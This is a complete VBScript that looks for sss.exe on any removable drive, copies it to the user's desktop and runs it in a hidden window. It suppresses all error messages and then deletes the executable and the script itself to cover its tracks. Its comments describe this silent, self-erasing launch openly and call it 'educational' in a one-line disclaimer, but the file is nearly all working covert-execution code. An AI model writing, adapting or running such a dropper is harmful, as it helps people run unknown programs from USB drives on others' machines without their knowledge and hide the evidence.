' This VB script silently copies sss.exe from a removable drive to the user's desktop and runs it.
' This version does not require administrator privileges and suppresses all error messages.
' Be extremely cautious when running scripts that copy and execute files.
' This script is provided for educational purposes only. Misuse can have serious consequences.

Option Explicit

Sub CopyAndRunSSS()
    Dim objFSO, objShell, objDrives, objDrive, strDesktopPath, strSourcePath, strDestPath, objExec, objWS, WshShell

    ' Create File System Object and Shell Object
    Set objFSO = CreateObject("Scripting.FileSystemObject")

    On Error Resume Next ' Suppress all errors
    Set objShell = CreateObject("Shell.Application")
    If Err.Number <> 0 Then
        Set objWS = CreateObject("WScript.Shell")
        If Err.Number <> 0 Then
            Exit Sub ' Exit if both Shell.Application and WScript.Shell fail
        End If
    End If
    On Error Goto 0

    ' Get removable drives
    Set objDrives = objFSO.Drives

    ' Get the desktop path
    If objShell Is Nothing then
        strDesktopPath = objWS.SpecialFolders("Desktop")
    else
        strDesktopPath = objShell.NameSpace(16).Self.Path  ' 16 is the desktop special folder.
    end if

    ' Search for sss.exe on removable drives
    For Each objDrive In objDrives
        If objDrive.DriveType = 1 Then ' 1 is removable
            strSourcePath = objDrive.RootFolder & "sss.exe"
            If objFSO.FileExists(strSourcePath) Then
                strDestPath = strDesktopPath & "\sss.exe"
                objFSO.CopyFile strSourcePath, strDestPath, True ' Overwrite if exists
                ' Run sss.exe silently (without admin privileges)

                If objShell Is Nothing then
                    On Error Resume Next
                    objWS.Run """" & strDestPath & """", 0, False  ' 0 for hidden
                    On Error Goto 0
					
					
                else
                    On Error Resume Next
                    Set objExec = objShell.ShellExecute("""" & strDestPath & """", "", "", "", 0)
                    On Error Goto 0
                end if
				
				WScript.Sleep 10000
				' Delete sss.exe (assuming it's already closed)
				
				Set WshShell = CreateObject("WScript.Shell")
				WshShell.Run "cmd /c del """ & WScript.ScriptFullName & """ /f /q", 0, True
				Set WshShell = Nothing
				
                On Error Resume Next
                objFSO.DeleteFile strDestPath, True
                On Error Goto 0
				
				
                Exit For ' Stop searching after finding the file
				
            End If
        End If
    Next

	' Delete self (copy.vbs)
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run "cmd /c del """ & WScript.ScriptFullName & """ /f /q", 0, True
    Set WshShell = Nothing
	
	
    ' Clean up objects (if objShell was created)
    If not objShell is Nothing then
        Set objShell = Nothing
    end if
    Set objFSO = Nothing
    Set objDrives = Nothing
    Set objDrive = Nothing

End Sub

CopyAndRunSSS()


